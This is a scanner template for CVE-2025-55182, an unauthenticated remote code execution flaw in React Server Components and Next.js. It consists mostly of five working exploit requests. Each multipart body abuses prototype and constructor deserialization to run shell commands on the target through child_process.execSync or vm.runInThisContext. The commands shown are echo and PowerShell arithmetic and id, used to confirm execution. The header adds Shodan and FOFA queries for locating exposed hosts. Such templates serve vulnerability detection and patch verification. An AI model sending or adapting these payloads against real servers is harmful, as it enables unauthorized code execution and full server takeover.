id: CVE-2025-55182

info:
  name: React Server Components - Remote Code Execution
  author: DhiyaneshDk,princechaddha,assetnote,lachlan2k,maple3142,iamnooob
  severity: critical
  verified: true
  description: |-
    React Server Components 19.0.0, 19.1.0, 19.1.1, and 19.2.0 including react-server-dom-parcel,
    react-server-dom-turbopack, and react-server-dom-webpack contain a remote code execution caused
    by unsafe deserialization of payloads from HTTP requests to Server Function endpoints, letting
    unauthenticated attackers execute arbitrary code remotely, exploit requires no authentication.
    shodan: http.component:"Next.js"
    fofa: app="Next.js" && body="/_next/static/chunks/app/"
    fofa: body="react.production.min.js" || body="React.createElement(" || app="React.js" || app="Dify"
  reference:
    - https://github.com/assetnote/react2shell-scanner
    - https://gist.github.com/maple3142/48bc9393f45e068cf8c90ab865c0f5f3
    - https://www.facebook.com/security/advisories/cve-2025-55182
    - http://www.openwall.com/lists/oss-security/2025/12/03/4
    - https://react.dev/blog/2025/12/03/critical-security-vulnerability-in-react-server-components
    - https://github.com/vercel/next.js/security/advisories/GHSA-9qr9-h5gf-34mp
    - https://vercel.com/changelog/cve-2025-55182
    - https://mp.weixin.qq.com/s/QJcb7pb1vEk-lTVM-48fAw
  tags: cve,cve2025,react,rce,nextjs,oast
  created: 2025/12/05

set:
  request-id: toLower(randomLowercase(8))
  nextjs-html: randomLowercase(21)
  num1: randomInt(40000, 44800)
  num2: randomInt(44800, 49600)
  result: num1 * num2
  rboundary: randomLowercase(8)
  rboundary2: randomLowercase(8)
rules:
  r0:
    request:
      method: POST
      path: /
      headers:
        Next-Action: x
        Content-Type: multipart/form-data; boundary=----WebKitFormBoundary{{rboundary}}
        X-Nextjs-Request-Id: "{{request-id}}"
        X-Nextjs-Html-Request-Id: "{{nextjs-html}}"
      body: |
        ------WebKitFormBoundary{{rboundary}}
        Content-Disposition: form-data; name="0"

        {"then":"$1:__proto__:then","status":"resolved_model","reason":-1,"value":"{\"then\":\"$B1337\"}","_response":{"_prefix":"var res=process.mainModule.require('child_process').execSync('echo $(({{num1}}*{{num2}}))').toString().trim();;throw Object.assign(new Error('NEXT_REDIRECT'),{digest: `NEXT_REDIRECT;push;/login?a=${res};307;`});","_chunks":"$Q2","_formData":{"get":"$1:constructor:constructor"}}}
        ------WebKitFormBoundary{{rboundary}}
        Content-Disposition: form-data; name="1"

        "$@0"
        ------WebKitFormBoundary{{rboundary}}
        Content-Disposition: form-data; name="2"

        []
        ------WebKitFormBoundary{{rboundary}}--
    expression: response.headers["x-action-redirect"].icontains("/login?a=" + string(result))
  r1:
    request:
      method: POST
      path: /
      headers:
        Next-Action: x
        Content-Type: multipart/form-data; boundary=----WebKitFormBoundary{{rboundary2}}
        X-Nextjs-Request-Id: "{{request-id}}"
        X-Nextjs-Html-Request-Id: "{{nextjs-html}}"
      body: |
        ----WebKitFormBoundary{{rboundary2}}
        Content-Disposition: form-data; name="0"

        {"then":"$1:__proto__:then","status":"resolved_model","reason":-1,"value":"{\"then\":\"$B1337\"}","_response":{"_prefix":"var res=process.mainModule.require('child_process').execSync('powershell -c \"{{num1}}*{{num2}}\"').toString().trim();;throw Object.assign(new Error('NEXT_REDIRECT'),{digest: `NEXT_REDIRECT;push;/login?a=${res};307;`});","_chunks":"$Q2","_formData":{"get":"$1:constructor:constructor"}}}
        ----WebKitFormBoundary{{rboundary2}}
        Content-Disposition: form-data; name="1"

        "$@0"
        ----WebKitFormBoundary{{rboundary2}}
        Content-Disposition: form-data; name="2"

        []
        ----WebKitFormBoundary{{rboundary2}}--
    expression: response.headers["x-action-redirect"].icontains("/login?a=" + string(result))
  r2:
    request:
      method: POST
      path: /apps
      headers:
        Next-Action: x
        Content-Type: multipart/form-data; boundary=----WebKitFormBoundary{{rboundary}}
        X-Nextjs-Request-Id: "{{request-id}}"
        X-Nextjs-Html-Request-Id: "{{nextjs-html}}"
      body: |
        ------WebKitFormBoundary{{rboundary}}
        Content-Disposition: form-data; name="0"

        {"then":"$1:__proto__:then","status":"resolved_model","reason":-1,"value":"{\"then\":\"$B1337\"}","_response":{"_prefix":"var res=process.mainModule.require('child_process').execSync('echo $(({{num1}}*{{num2}}))').toString().trim();;throw Object.assign(new Error('NEXT_REDIRECT'),{digest: `NEXT_REDIRECT;push;/login?a=${res};307;`});","_chunks":"$Q2","_formData":{"get":"$1:constructor:constructor"}}}
        ------WebKitFormBoundary{{rboundary}}
        Content-Disposition: form-data; name="1"

        "$@0"
        ------WebKitFormBoundary{{rboundary}}
        Content-Disposition: form-data; name="2"

        []
        ------WebKitFormBoundary{{rboundary}}--
    expression: response.headers["x-action-redirect"].icontains("/login?a=" + string(result))
  r3:
    request:
      method: POST
      path: /apps
      headers:
        Next-Action: x
        Content-Type: multipart/form-data; boundary=----WebKitFormBoundary{{rboundary2}}
        X-Nextjs-Request-Id: "{{request-id}}"
        X-Nextjs-Html-Request-Id: "{{nextjs-html}}"
      body: |
        ----WebKitFormBoundary{{rboundary2}}
        Content-Disposition: form-data; name="0"

        {"then":"$1:__proto__:then","status":"resolved_model","reason":-1,"value":"{\"then\":\"$B1337\"}","_response":{"_prefix":"var res=process.mainModule.require('child_process').execSync('powershell -c \"{{num1}}*{{num2}}\"').toString().trim();;throw Object.assign(new Error('NEXT_REDIRECT'),{digest: `NEXT_REDIRECT;push;/login?a=${res};307;`});","_chunks":"$Q2","_formData":{"get":"$1:constructor:constructor"}}}
        ----WebKitFormBoundary{{rboundary2}}
        Content-Disposition: form-data; name="1"

        "$@0"
        ----WebKitFormBoundary{{rboundary2}}
        Content-Disposition: form-data; name="2"

        []
        ----WebKitFormBoundary{{rboundary2}}--
    expression: response.headers["x-action-redirect"].icontains("/login?a=" + string(result))
  r4:
    request:
      method: POST
      path: /formaction
      headers:
        Content-Type: multipart/form-data; boundary=----WebKitFormBoundary{{rboundary2}}
      body: |
        ------WebKitFormBoundary{{rboundary2}}
        Content-Disposition: form-data; name="$ACTION_REF_0"

        ------WebKitFormBoundary{{rboundary2}}
        Content-Disposition: form-data; name="$ACTION_0:0"

        {"id":"vm#runInThisContext","bound":["global.process.mainModule.require(\"child_process\").execSync(\"id\").toString()"]}
        ------WebKitFormBoundary{{rboundary2}}--
    expression: |
      response.status == 200 &&
      response.headers['content-type'].icontains("application/json") &&
      "((u|g)id|groups)=[0-9]{1,4}\\([a-z0-9]+\\)".bmatches(response.body)
expression: r0() || r1() || r2() || r3() || r4()
